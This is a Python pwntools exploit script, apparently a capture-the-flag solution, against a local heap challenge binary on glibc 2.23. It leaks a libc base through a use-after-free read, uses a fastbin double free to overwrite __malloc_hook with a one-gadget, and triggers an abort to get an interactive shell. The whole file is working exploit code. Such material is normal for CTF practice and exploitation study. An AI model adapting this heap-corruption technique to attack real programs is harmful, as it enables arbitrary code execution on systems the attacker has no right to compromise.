from pwn import *
context.binary=exe=ELF("./pwn2_df_patched",checksec=False)
libc=ELF("./libc.2.23.so",checksec=False)
p=process(exe.path)

def create(idx,size,data):
    p.sendafter(b">\n",b"1")
    p.sendafter(b"Index:",idx)
    p.sendafter(b"Input size:",size)
    p.sendafter(b"Input data:",data)

def show(idx):
    p.sendafter(b">\n",b"2")
    p.sendafter(b"Index:",idx)

def edit(idx,data):
    p.sendafter(b">\n",b"3")
    p.sendafter(b"Index:",idx)
    p.sendline(data)

def delete(idx):
    p.sendafter(b">\n",b"4")
    p.sendafter(b"Input index:",idx)

input()
##############Stage 1:leak libc address###############
create(b"0",b"400",b"A"*8)
create(b"1",b"500",b"B"*8)
delete(b"0")
show(b"0")
p.recvuntil(b"Data = ")
leak=int.from_bytes(p.recvline()[:-1],"little")
log.info("[+]leak:"+hex(leak))
libc.address=leak-0x39bb78
malloc_hook=libc.address+0x39bb10
#log.info("[+]heap address:"+hex(heapaddres))
log.info("[+]libc base:"+hex(libc.address))
log.info("[+]__malloc_hook:"+hex(malloc_hook))
free_hook=libc.address+0x39d7a8
system=libc.address+0x3f550
######################################################

create(b"2",b"104",b"C"*8)
create(b"3",b"104",b"D"*8)
delete(b"2")
delete(b"3")
delete(b"2")


create(b"4",b"104",p64(malloc_hook-35))
create(b"5",b"104",b"E"*8)
payload2=b"\x00"*8+p64(0x21)+p64(0x31)
create(b"6",b"104",payload2)
print(hex(libc.address))
payload3=b"Y"*19+p64(libc.address+0x3f42a)

create(b"7",b"104",payload3)
show(b"7")
p.recvuntil(b"Data = ")
leak2=int.from_bytes(p.recvline()[:-1],"little")
log.info("[+]leak2:"+hex(leak2))
## trigger abort to get shell
delete(b"0")
delete(b"0")

p.interactive()